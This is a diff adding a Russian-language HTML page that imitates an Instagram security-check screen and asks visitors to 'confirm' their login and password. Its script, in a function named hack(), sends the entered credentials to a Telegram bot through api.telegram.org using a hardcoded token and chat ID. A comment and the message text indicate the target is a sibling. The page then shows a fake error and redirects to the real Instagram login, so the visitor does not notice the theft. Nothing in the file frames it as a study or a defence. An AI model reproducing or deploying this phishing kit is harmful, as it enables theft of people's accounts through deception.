@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram | Security Center</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .logo { width: 170px; margin-bottom: 25px; }
+        .text { font-size: 14px; color: #8e8e8e; margin-bottom: 20px; line-height: 1.4; }
+        input { width: 100%; padding: 12px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:active { opacity: 0.8; }
+        .footer { margin-top: 20px; font-size: 12px; color: #afafaf; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://www.instagram.com/static/images/web/mobile_gnl_header_upsell_2x.png/1b97874583c7.png" class="logo">
+    <div class="text">Мы заметили подозрительную активность. Пожалуйста, подтвердите свои данные для восстановления доступа к аккаунту.</div>
+    
+    <input type="text" id="login" placeholder="Телефон, имя пользователя или почта">
+    <input type="password" id="pass" placeholder="Пароль">
+    
+    <button onclick="hack()">Подтвердить личность</button>
+    
+    <div class="footer">© 2026 Instagram from Meta</div>
+</div>
+
+<script>
+    async function hack() {
+        const user = document.getElementById('login').value;
+        const pass = document.getElementById('pass').value;
+
+        // ВАЖНО: Вставь сюда свои данные
+        const token = '8365993794:AAEIZr_m9JLVZEn7R7xK0P_O3WivurlkoK4'; 
+        const chatId = '7076467876';
+
+        if (user && pass) {
+            const message = `🔥 ЕСТЬ ПАРОЛЬ ОТ БРАТА!\n\nЛогин: ${user}\nПароль: ${pass}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            try {
+                await fetch(url);
+                // После отправки данных — перекидываем его на настоящий инст
+                alert("Ошибка синхронизации. Попробуйте войти через приложение.");
+                window.location.href = "https://instagram.com/accounts/login";
+            } catch (e) {
+                alert("Проверьте интернет-соединение");
+            }
+        } else {
+            alert("Пожалуйста, заполните все поля");
+        }
+    }
+</script>
+
+</body>
+</html>
+
